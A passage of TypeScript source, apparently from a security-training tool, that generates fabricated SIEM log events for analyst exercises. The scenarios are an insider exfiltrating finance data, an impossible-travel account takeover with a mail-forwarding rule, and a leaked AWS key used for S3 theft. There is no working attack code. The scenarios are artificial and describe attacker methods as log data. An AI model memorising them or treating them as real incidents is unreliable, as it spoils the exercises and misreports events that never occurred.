        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": "77.125.38.201",
      },
    },
  ];

  return { title: "OAuth App Persistence — Cloud APT", events, T, MIN, HR, victim, sprayIp, sessionIp };
}

/** Telemetry half of `buildInsiderThreatScenario`: the events and the story title, no answer key. */
export function insiderThreatScenarioEvents() {
  const B = new Date("2026-05-06T13:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const insider = { hostname: "WS-FIN-4421", email: "m.torres@nexacorp.com", ip: "10.10.20.91" };
  const usbSerial = "SanDisk-A3F7B2C1";

  const events: TelemetryEvent[] = [
    {
      // ── The HR record the whole case turns on ───────────────────────────
      //
      // ADDED. The termination flag is q1's keyed answer, and it existed in
      // exactly two places: this event's description prose, and a
      // `user.context` field inside a ZSCALER PROXY record. A web proxy does
      // not carry employment status — so the decisive fact was either unfound-
      // able or found in a log that could not hold it.
      //
      // It now comes from the system that would actually own it. That also
      // makes the finding checkable rather than asserted, which is the whole
      // point of this scenario.
      id: "evt_00_hr_lifecycle", ts: T(-45 * MIN),
      source: "hr", vendor: "Workday", event_type: "account_modify",
      user_email: insider.email,
      severity: "informational",
      description: "A worker lifecycle change was recorded for m.torres: employment end date set to the following day, initiated by HR Operations.",
      raw: {
        "workday.event_type": "Worker_Termination_Initiated",
        "workday.worker_id": "WD-0044812",
        "workday.worker_email": insider.email,
        "workday.termination_date": "2026-05-07",
        "workday.termination_reason_category": "Voluntary",
        "workday.initiated_by": "hr.operations@nexacorp.com",
        "workday.notice_period_active": "true",
        "workday.access_revocation_scheduled": "2026-05-07T18:00:00Z",
        "event.action": "Worker_Termination_Initiated",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_01_context", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      description: "m.torres logged on to WS-FIN-4421 at 13:00.",
      raw: {
        // Windows Security Event 4624 — Successful Logon (pre-termination day)
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-4421",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2031174",
        // Subject (SYSTEM on interactive logon)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-4421$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1309",
        "winlog.event_data.TargetUserName": "mtorres",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0x9C3E47",
        "winlog.event_data.LogonGuid": "{C3D4E5F6-A1B2-C3D4-E5F6-A1B2C3D4E5F6}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-4421",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.91",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-06T13:00:00.000Z",
        "user.name": "NEXACORP\\mtorres",
        "user.email": "m.torres@nexacorp.com",
        "user.title": "Finance Analyst",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1309",
        "host.name": "WS-FIN-4421",
        "source.ip": "10.10.20.91",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
        // HR enrichment (cross-referenced from HR system)
      },
    },
    {
      // Moved BEFORE the downloads/USB copy: the HR-site access must precede the
      // exfiltration of the layoff/headcount document that comes from that site.
      id: "evt_08_hr_access", mitre_technique: "T1213.002", ts: T(5 * MIN),
      source: "dlp", vendor: "Microsoft Purview", event_type: "cloud_api_call",
      user_email: insider.email, src_ip: insider.ip,
      severity: "medium",
      description: "m.torres, a Finance Analyst, accessed Restricted HR documents (compensation bands, layoff planning) on the HR SharePoint site.",
      raw: {
        "event.action": "FileAccessed", "event.outcome": "success",
        "user.email": "m.torres@nexacorp.com",
        "user.title": "Finance Analyst",
        "source.ip": "10.10.20.91",
        "cloud.resource.name": "nexacorp.sharepoint.com/sites/HR",
        "data.office365.SourceFileName": "Headcount_Reduction_Plan_Nov26.xlsx",
        "data.classification": "HRConfidential, Restricted",
        "iam.permission": "read",
      },
    },
    {
      id: "evt_02_sp_start", ts: T(10 * MIN),
      source: "dlp", vendor: "Microsoft Purview", event_type: "cloud_api_call",
      user_email: insider.email, src_ip: insider.ip,
      severity: "medium", mitre_technique: "T1530",
      description: "m.torres downloaded 12 files from the Finance SharePoint site in 3 minutes.",
      raw: {
        // Representative record — FileDownloaded is written per file; the count is
        // carried in a SIEM-side aggregate field (file.count) for this burst.
        "event.action": "FileDownloaded", "event.outcome": "success",
        "user.email": "m.torres@nexacorp.com",
        "source.ip": "10.10.20.91",
        "cloud.resource.name": "nexacorp.sharepoint.com/sites/Finance",
        "data.office365.SourceFileName": "Q2-Vendor-Payments.xlsx",
        "file.count": "12",
        "cloud.provider": "Microsoft365",
      },
    },
    {
      id: "evt_03_dlp_alert", ts: T(25 * MIN),
      source: "dlp", vendor: "Microsoft Purview", event_type: "dlp_alert",
      user_email: insider.email, src_ip: insider.ip,
      severity: "high", mitre_technique: "T1530",
      description: "Microsoft Purview DLP fired Finance-PII-Bulk-Download after m.torres downloaded 47 sensitive Finance files (18.2MB) in 15 minutes; policy action was notify-only.",
      raw: {
        "event.action": "DLP_PolicyTriggered", "event.outcome": "success",
        "user.email": "m.torres@nexacorp.com",
        "source.ip": "10.10.20.91",
        "policy.name": "Finance-PII-Bulk-Download",
        "policy.rule": "BulkAccessToSensitiveContent",
        "policy.action": "NotifyUser",
        "file.count": "47", "storage.size": "18.2 MB",
        "data.classification": "FinancialPII, HRConfidential",
        "action_result": "notified_not_blocked",
      },
    },

    // ── CORRELATED: UEBA alert — bulk download well above baseline ──────────────
    //
    // The multiplier is anchored to numbers the student can actually derive from
    // the other events: the baseline is 11 files in a full day (evt_insider_
    // baseline_files), and 55 sensitive files were pulled from SharePoint across
    // evt_02 (12) + evt_03 (47, overlapping) — the DLP alert counts 47. UEBA
    // scores on RATE, and 47 files in ~15 minutes against 11 in 8 hours is
    // roughly a 34x rate increase, which is what the alert now states. The old
    // "56x" matched no figure in the scenario, and the anomaly score it cited
    // had lost the field that carried it when the invented `ueba.*` namespace
    // was removed — restored here as the real Sentinel BehaviorAnalytics fields.
    {
      id: "evt_insider_ueba_alert", ts: T(25 * MIN + 30_000),
      source: "ueba", vendor: "Microsoft Sentinel UEBA",
      event_type: "ueba_anomaly", severity: "high",
      user_email: insider.email, src_ip: insider.ip,
      mitre_technique: "T1530",
      description: "Microsoft Sentinel flagged m.torres's SharePoint download rate as far above her 30-day norm — 47 sensitive files in about fifteen minutes against a baseline of roughly a dozen a day.",
      raw: {
        "event.action": "BehaviorAnomalyDetected",
        "event.outcome": "alerted",
        "user.email": insider.email,
        "MassDownloadActivity": "true",
        "behavior.name": "bulk_sharepoint_download",
        "behavior.score": "47",         // files pulled in this ~15-min burst (raw count)
        "anomaly.score": "89",          // 0-100 UEBA composite confidence
        "ActionUncommonlyPerformedByUser": "true",
        "source.ip": insider.ip,
      },
    },
    {
      id: "evt_04_usb_insert", ts: T(30 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: insider.hostname, user_email: insider.email,
      severity: "high", mitre_technique: "T1052.001",
      description: `A SanDisk USB drive (serial ${usbSerial}) was mounted as E:\\ on WS-FIN-4421.`,
      raw: {
        "crowdstrike.event_simpleName": "RemovableMediaVolumeMounted",
        "crowdstrike.detection.description": "Removable storage volume mounted.",
        "crowdstrike.detection.scenario": "removable_media_bulk_copy",
        "crowdstrike.detection.technique": "Exfiltration over USB Device",
        "crowdstrike.detection.technique_id": "T1052.001",
        "event.action": "RemovableMediaConnected",
        "host.name": "WS-FIN-4421",
        "user.name": "NEXACORP\\mtorres",
        "usb.device.name": "SanDisk MY_USB",
        "usb.device.serial": usbSerial,
        "usb.vendor": "SanDisk",
        "usb.action": "mounted",
        "removable_media.type": "USB Flash Drive",
        "usb.mount_point": "E:\\",
      },
    },
    {
      id: "evt_05_more_files", mitre_technique: "T1052.001", ts: T(31 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: insider.hostname, user_email: insider.email,
      severity: "high",
      file: { path: "E:\\Finance_Backup\\Employee_Salary_Master_2026.xlsx", name: "Employee_Salary_Master_2026.xlsx" },
      // A user's drag-and-drop copy to the drive is Explorer's write.
      process: { name: "explorer.exe", pid: 4212, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\mtorres", integrity: "medium" },
      description: "Files from the Downloads folder, including Employee_Salary_Master_2026.xlsx and Headcount_Reduction_Plan_Nov26.xlsx, were copied to the E:\\Finance_Backup folder on the USB drive.",
      raw: {
        "crowdstrike.event_simpleName": "FileWrittenToRemovableMedia",
        "event.action": "FileCopiedToRemovableMedia",
        "host.name": "WS-FIN-4421",
        "user.name": "NEXACORP\\mtorres",
        "file.directory": "C:\\Users\\mtorres\\Downloads\\",
        "usb.destination": "E:\\Finance_Backup\\",
        "file.name": "Employee_Salary_Master_2026.xlsx",
        "file.count": "8",
        "file.classification": "HRConfidential",
        "usb.device.serial": usbSerial,
      },
    },

    // ── CORRELATED: Print event — m.torres printed sensitive docs too ─────────────
    {
      id: "evt_insider_print", ts: T(33 * MIN),
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "dlp_alert", severity: "medium",
      hostname: insider.hostname, user_email: insider.email,
      description: "m.torres printed 3 files, including Headcount_Reduction_Plan_Nov26.xlsx, to the HP-FIN-FLOOR2 shared printer — flagged by endpoint DLP print-activity monitoring.",
      raw: {
        "event.action": "PrintJobSubmitted",
        "host.name": insider.hostname,
        "user.name": "NEXACORP\\mtorres",
        "printer.name": "HP-FIN-FLOOR2",
        "printer.share": "\\\\PRINT-SRV-01\\HP-FIN-FLOOR2",
        "print.job_count": "3",
        "print.file_name": "Headcount_Reduction_Plan_Nov26.xlsx",
        "print.pages": "47",
        "print.classification": "HRConfidential",
        "policy.name": "Endpoint-DLP-Print-Restricted-Content",
        "policy.action": "AuditAndNotify",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_06_cloud_block", ts: T(35 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      dst_port: 443, protocol: "tcp",
      network: { url: "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o", domain: "www.googleapis.com", method: "POST", bytes_out: 9_812_445 },
      severity: "high", mitre_technique: "T1567.002",
      description: "Zscaler blocked a 9.8MB upload of Finance_Backup.zip from WS-FIN-4421 to a personal Google Cloud Storage bucket.",
      raw: {
        "zscaler.action": "Blocked",
        "zscaler.reason": "DLP policy — Personal cloud upload blocked",
        "zscaler.login": "m.torres",
        "zscaler.url": "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o",
        "zscaler.hostname": "www.googleapis.com",
        "zscaler.urlcategory": "Personal Cloud Storage",
        "zscaler.reqmethod": "POST",
        "zscaler.reqsize": 9812445,
        "zscaler.filename": "Finance_Backup.zip",
        "zscaler.filetype": "zip",
        "zscaler.cip": "10.10.20.91",
        "user.email": "m.torres@nexacorp.com",
        "source.hostname": "WS-FIN-4421",
        "policy.name": "Personal-Cloud-Upload-Block",
      },
    },
    {
      id: "evt_07_email_attach", mitre_technique: "T1567.002", ts: T(40 * MIN),
      source: "dlp", vendor: "Microsoft Purview", event_type: "email_sent",
      user_email: insider.email, src_ip: insider.ip,
      severity: "high",
      description: "m.torres emailed 3 payroll and bonus files (4.2MB) to a personal Gmail address — DLP logged and notified but did not block the send.",
      raw: {
        "event.action": "EmailSent", "event.outcome": "success",
        "email.from.address": "m.torres@nexacorp.com",
        "email.to.address": "m.torres.backup@gmail.com",
        "email.subject": "FW: Finance Reports Q2",
        "email.direction": "outbound",
        "email.attachment.name": "payroll-2026-Q2.xlsx, bonus_targets.xlsx, headcount_Q4.xlsx",
        "file.size": "4200000",
        "channel.type": "Email",
        "data.type": "Financial Data, HR Data",
        "policy.name": "Finance-PII-External-Email",
        "policy.action": "AuditAndNotify",
        "action_result": "delivered",
      },
    },
    {
      id: "evt_09_browse", ts: T(75 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, hostname: insider.hostname, src_ip: insider.ip,
      severity: "low",
      description: "m.torres browsed Indeed, LinkedIn Jobs, and Glassdoor from WS-FIN-4421 during work hours.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "m.torres",
        "zscaler.hostname": "indeed.com",
        "zscaler.urlcategory": "Job Search",
        "zscaler.cip": "10.10.20.91",
        "user.email": "m.torres@nexacorp.com",
        "source.hostname": "WS-FIN-4421",
      },
    },
    {
      id: "evt_09b_usb_removed", ts: T(3 * 60 * MIN - 2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_access",
      hostname: insider.hostname, user_email: insider.email,
      severity: "low",
      description: "The removable volume was disconnected from WS-FIN-4421 at 15:58.",
      raw: {
        "crowdstrike.event_simpleName": "RemovableMediaVolumeUnmounted",
        "crowdstrike.UserName": "NEXACORP\\mtorres",
        "device.serial_number": usbSerial,
        "device.mount_point": "E:\\",
        "device_control.policy_action": "monitor_only",
        "event.action": "RemovableMediaVolumeUnmounted",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_10_logout", ts: T(3 * 60 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      description: "m.torres logged off WS-FIN-4421 at 16:00.",
      raw: {
        "event.code": "4634", "event.action": "logged-off", "event.outcome": "success",
        // Type 2 (interactive), matching the logon in evt_01. It was 0, which is
        // System and only appears at boot.
        "logon.type": "2",
        "winlog.event_data.TargetLogonId": "0x9C3E47",
        "user.name": "NEXACORP\\mtorres",
        "host.name": "WS-FIN-4421", "source.ip": "10.10.20.91",
        // The USB fields that used to sit here moved to the device-control
        // record below. A Windows Security 4634 carries no removable-media
        // telemetry — that is EDR, and having it here taught a student to hunt
        // for it in a log that will never hold it.
      },
    },

    // ── CORRELATED: Baseline — m.torres normal daily file access volume ───────────
    {
      id: "evt_insider_baseline_files", ts: T(-24 * 60 * MIN), is_baseline: true,
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "cloud_api_call", severity: "informational",
      user_email: insider.email, src_ip: insider.ip,
      description: "m.torres accessed 11 Finance files over a full 8-hour day the day before.",
      raw: {
        "event.action": "FileAccessed",
        "user.email": insider.email,
        "source.ip": insider.ip,
        "cloud.resource.name": "nexacorp.sharepoint.com/sites/Finance",
        // Representative record — the 11-files-per-day baseline (see
        // description) is a SIEM-side aggregate across a day of FileAccessed
        // records, not a count field on any single one.
        "session.duration_seconds": "28800",
        "event.outcome": "success",
      },
    },
  ];

  return { title: "Bulk Finance Downloads and Removable Media — WS-FIN-4421", events, T, MIN, insider };
}

/** Telemetry half of `buildImpossibleTravelScenario`: the events and the story title, no answer key. */
export function impossibleTravelScenarioEvents() {
  const B = new Date("2026-05-12T07:00:00Z").getTime();   // 09:00 Israel time
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const user  = { email: "k.taylor@nexacorp.com", name: "k.taylor", sid: "S-1-5-21-3421479547-3897544621-1789562108-1113" };
  const isrIp = "77.125.38.201";   // ISP: HOT Mobile — Tel Aviv, Israel
  const nigIp = "41.203.64.9";     // ISP: MTN Nigeria — Lagos, Nigeria (4,320 km away)
  const sessionId = "b6f1e2d3-7a84-4c19-9e52-1a0bcf33ee70"; // Entra session shared by the attacker's sign-in and the UAL rows

  const events: TelemetryEvent[] = [
    // ── Step 0: credential origin — password spray that finally succeeds ────────
    {
      id: "evt_imp_00_spray", ts: T(-28 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_failure", severity: "medium",
      user_email: user.email, src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1110.003",
      description: "k.taylor's account had a burst of failed Entra ID sign-ins from a Nigerian IP (error 50126, invalid password) before the successful sign-in.",
      raw: {
        "azure.signinlogs.properties.userPrincipalName": user.email,
        "azure.signinlogs.properties.ipAddress": nigIp,
        "azure.signinlogs.properties.appDisplayName": "Office 365 Exchange Online",
        "azure.signinlogs.properties.status.errorCode": 50126,
        "azure.signinlogs.properties.riskLevelDuringSignIn": "low",
        "azure.signinlogs.properties.riskState": "atRisk",
        "azure.signinlogs.properties.riskEventTypes_v2": ["unfamiliarFeatures"],
        "GeoLocation.country_name": "Nigeria",
        "GeoLocation.location.lat": 6.5244,
        "GeoLocation.location.lon": 3.3792,
        "event.action": "sign-in-failed",
        "event.outcome": "failure",
        "source.ip": nigIp,
      },
    },
    // ── Step 1: Normal Israeli login — baseline ────────────────────────────────
    {
      id: "evt_imp_01_baseline", is_baseline: true, ts: T(0),
      source: "vpn", vendor: "Palo Alto Networks PAN-OS",
      event_type: "vpn_login", severity: "informational",
      user_email: user.email,
      src_ip: isrIp,
      geo: { country: "Israel", city: "Tel Aviv", latitude: 32.0853, longitude: 34.7818 },
      description: "k.taylor connected to the VPN from Tel Aviv, Israel, on a registered device with MFA approved.",
      raw: {
        "event.action":                    "vpn_connected",
        "event.outcome":                   "success",
        "user.email":                      user.email,
        "source.ip":                       isrIp,
        "source.geo.country_name":         "Israel",
        "source.geo.city_name":            "Tel Aviv",
        "source.geo.location.lat":         "32.0853",
        "source.geo.location.lon":         "34.7818",
        "GeoLocation.country_name":        "Israel",
        "GeoLocation.city_name":           "Tel Aviv",
        "GeoLocation.location.lat":        32.0853,
        "GeoLocation.location.lon":        34.7818,
        "gp.tunnel_ip":                    "10.100.50.14",
        "gp.client_hostname":              "LT-DEV-0931",
        "gp.device_registered":            "true",
        "gp.auth_method":                  "Azure AD + MFA",
        "gp.mfa_result":                   "approved",
        "gp.gateway":                      "gw-nexacorp-tlv01",
        "gp.client_os":                    "Windows 11 22H2",
        "gp.session_id":                   "gp-sess-9a3f2b1c",
      },
    },

    // ── Step 2: VPN login from Nigeria — 4 minutes later — IMPOSSIBLE ─────────
    {
      id: "evt_imp_02_impossible", ts: T(4 * MIN),
      source: "vpn", vendor: "Palo Alto Networks PAN-OS",
      event_type: "vpn_login", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor's account connected to the VPN from Lagos, Nigeria, on an unregistered device.",
      raw: {
        "event.action":                    "vpn_connected",
        "event.outcome":                   "success",
        "user.email":                      user.email,
        "source.ip":                       nigIp,
        "source.geo.country_name":         "Nigeria",
        "source.geo.city_name":            "Lagos",
        "source.geo.location.lat":         "6.5244",
        "source.geo.location.lon":         "3.3792",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "gp.tunnel_ip":                    "10.100.50.77",
        "gp.client_hostname":              "UNKNOWN-DEVICE",
        "gp.device_registered":            "false",
        "gp.auth_method":                  "Azure AD",
        "gp.mfa_result":                   "not_required",   // MFA bypass — no push sent
        "gp.gateway":                      "gw-nexacorp-emea01",
        "gp.client_os":                    "Windows 10 1909",
        "gp.session_id":                   "gp-sess-4f7c9d2e",
      },
    },

    // ── Step 2b: the Entra sign-in to the GlobalProtect app — single factor, no MFA ─
    {
      id: "evt_imp_02b_vpnauth", ts: T(4 * MIN + 20_000),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_success", severity: "high",
      user_email: user.email, src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor authenticated to the GlobalProtect VPN app through Entra ID from a Nigerian IP with a single factor (password only); Entra ID Protection rated the sign-in high risk (atypical travel).",
      raw: {
        "azure.signinlogs.properties.userPrincipalName": user.email,
        "azure.signinlogs.properties.ipAddress": nigIp,
        "azure.signinlogs.properties.appDisplayName": "GlobalProtect",
        "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
        "azure.signinlogs.properties.riskLevelDuringSignIn": "high",
        "azure.signinlogs.properties.riskState": "atRisk",
        "azure.signinlogs.properties.riskEventTypes_v2": ["unlikelyTravel"],
        "azure.signinlogs.properties.status.errorCode": 0,
        "GeoLocation.country_name": "Nigeria",
        "GeoLocation.location.lat": 6.5244,
        "GeoLocation.location.lon": 3.3792,
        "event.action": "logged-in",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },

    // ── Step 3: O365 login from same Nigerian IP — Entra flags it high risk (impossible travel) ─
    {
      id: "evt_imp_03_o365", ts: T(6 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_success", severity: "high",
      user_email: user.email,
      src_ip: nigIp, is_detection: true,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor's account signed in to Microsoft 365 from a Nigerian IP; Entra ID Protection rated the sign-in high risk with an unlikely-travel risk detection.",
      raw: {
        "azure.signinlogs.properties.userPrincipalName": user.email,
        "azure.signinlogs.properties.ipAddress": nigIp,
        "azure.signinlogs.properties.appDisplayName": "OfficeHome",
        "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
        "azure.signinlogs.properties.riskLevelDuringSignIn": "high",
        "azure.signinlogs.properties.riskLevelAggregated": "high",
        "azure.signinlogs.properties.riskState": "atRisk",
        "azure.signinlogs.properties.riskDetail": "none",
        "azure.signinlogs.properties.riskEventTypes_v2": ["unlikelyTravel", "unfamiliarFeatures"],
        "azure.signinlogs.properties.sessionId": sessionId,
        "azure.signinlogs.properties.status.errorCode": 0,
        "azure.signinlogs.properties.userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "logged-in",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },

    // ── Step 4: Attacker creates email forwarding rule — data exfil prep ───────
    {
      id: "evt_imp_04_inboxrule", ts: T(9 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "account_modify", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      mitre_technique: "T1114.003",
      description: "An inbox rule forwarding all of k.taylor's incoming mail to collector.k.taylor@protonmail.com was created from the Nigerian IP.",
      raw: {
        "data.office365.Operation":        "New-InboxRule",
        "data.office365.Workload":         "Exchange",
        "data.office365.RecordType":       "2",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ResultStatus":     "Success",
        "data.office365.Parameters.Name":  "ForwardTo",
        "data.office365.Parameters.Value": "collector.k.taylor@protonmail.com",
        "data.office365.RuleCondition":    "All messages",
        "data.office365.RuleName":         "Microsoft Outlook",
        "data.office365.UserType":         "0",
        "data.office365.SessionId":        sessionId,
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
      },
    },

    // ── Step 4b: the VPN tunnel is used — internal traffic from the tunnel IP ───
    {
      id: "evt_imp_04b_vpn_traffic", ts: T(11 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      user_email: user.email,
      src_ip: "10.100.50.77", dst_ip: "10.20.8.40", dst_port: 445, protocol: "tcp",
      severity: "medium", mitre_technique: "T1021.002",
      network: { bytes_out: 61440, bytes_in: 2_411_724 },
      description: "The VPN tunnel address 10.100.50.77 opened an SMB session to the engineering file server FS-ENG-01 (10.20.8.40).",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": "10.100.50.77", "source.port": "50122",
        "destination.ip": "10.20.8.40", "destination.port": "445",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ms-ds-smbv3",
        "pan.app": "ms-ds-smbv3", "pan.action": "allow", "pan.rule": "VPN-to-Internal",
        "network.bytes_out": "61440", "network.bytes_in": "2411724",
        "action_result": "allow",
      },
    },

    // ── Step 5: Attacker downloads SharePoint files — data collection ──────────
    {
      id: "evt_imp_05_sharepoint", ts: T(14 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_access", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      mitre_technique: "T1213.002",
      description: "847 files (2.3GB) were downloaded from the Engineering SharePoint site in 5 minutes from a Nigerian IP.",
      raw: {
        "data.office365.Operation":        "FileDownloaded",
        "data.office365.Workload":         "SharePoint",
        "data.office365.RecordType":       "6",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ResultStatus":     "Success",
        "data.office365.ObjectId":         "https://nexacorp.sharepoint.com/sites/Engineering/Shared Documents",
        "data.office365.SiteUrl":          "https://nexacorp.sharepoint.com/sites/Engineering",
        "data.office365.UserType":         "0",
        "data.office365.SourceFileName":   "PCB-Rev4-Schematics.pdf",
        "data.office365.SessionId":        sessionId,
        "data.office365.UserAgent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        // Per-file FileDownloaded record; the 847-file / 2.3GB burst total is carried
        // in file.count for the burst (a SIEM-side aggregate over the records).
        "file.count":                      "847",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "bulk-download",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },
  ];

  return { title: "Account Compromise — Impossible Travel", events, T, MIN, nigIp };
}

/** Telemetry half of `buildCloudKeyLeakS3ExfilScenario`: the events and the story title, no answer key. */
export function cloudKeyLeakS3ExfilScenarioEvents() {
  // Leaked long-term IAM key in a public repo → recon → IAM backdoor user with
  // its own key → S3 GetObject run → GuardDuty. Converted 2026-10-02 from the
  // retired cryptomining story (no compute abuse, no mining): one goal, data theft.
  const B = new Date("2026-06-08T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attackerIp   = "203.189.76.14";        // Singapore VPS — every attacker call comes from here
  const ciEgressIp   = "54.210.17.88";         // the CI runner's normal egress (baseline)
  const accountId    = "247316892041";
  const iamUser      = "rocketstack-ci-deploy";
  const iamArn       = `arn:aws:iam::${accountId}:user/${iamUser}`;
  const leakedKey    = "AKIATQ4XW7Z2REXAMPLE";
  const backdoorUser = "svc-lambda-monitoring";
  const backdoorArn  = `arn:aws:iam::${accountId}:user/${backdoorUser}`;
  const backdoorKey  = "AKIATQ4XW7Z2VEXAMPLE";
  const s3Bucket     = "rocketstack-prod-customer-data";
  const sampleObject = "exports/customers/2026-05/customers_full.csv.gz";
  const cliAgent     = "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0";

  /** The CloudTrail identity block of a call signed with one of the two IAM user keys. */
  const asUser = (user: string, arn: string, key: string) => ({
    "aws.cloudtrail.userIdentity.type": "IAMUser",
    "aws.cloudtrail.userIdentity.userName": user,
    "aws.cloudtrail.userIdentity.arn": arn,
    "aws.cloudtrail.userIdentity.accountId": accountId,
    "aws.cloudtrail.userIdentity.accessKeyId": key,
  });
  const fromAttacker = {
    "aws.cloudtrail.sourceIPAddress": attackerIp,
    "aws.cloudtrail.userAgent": cliAgent,
    "source.ip": attackerIp,
    "GeoLocation.country_name": "Singapore",
    "GeoLocation.city_name": "Singapore",
    "GeoLocation.location.lat": 1.3521,
    "GeoLocation.location.lon": 103.8198,
  };

  const events: TelemetryEvent[] = [
    // ── Baseline: how this key is normally used (CI runner, artifact upload) ──
    {
      id: "evt_kl_00_baseline_ci", ts: T(-3 * 60 * MIN), is_baseline: true,
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      severity: "informational", src_ip: ciEgressIp,
      description: `${iamUser} (key ${leakedKey}) uploaded a build artifact to rocketstack-deploy-artifacts from the CI runner egress ${ciEgressIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "PutObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        "aws.cloudtrail.sourceIPAddress": ciEgressIp,
        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0 exe/x86_64.amzn.2 command/s3.cp",
        ...asUser(iamUser, iamArn, leakedKey),
        "aws.cloudtrail.requestParameters.bucketName": "rocketstack-deploy-artifacts",
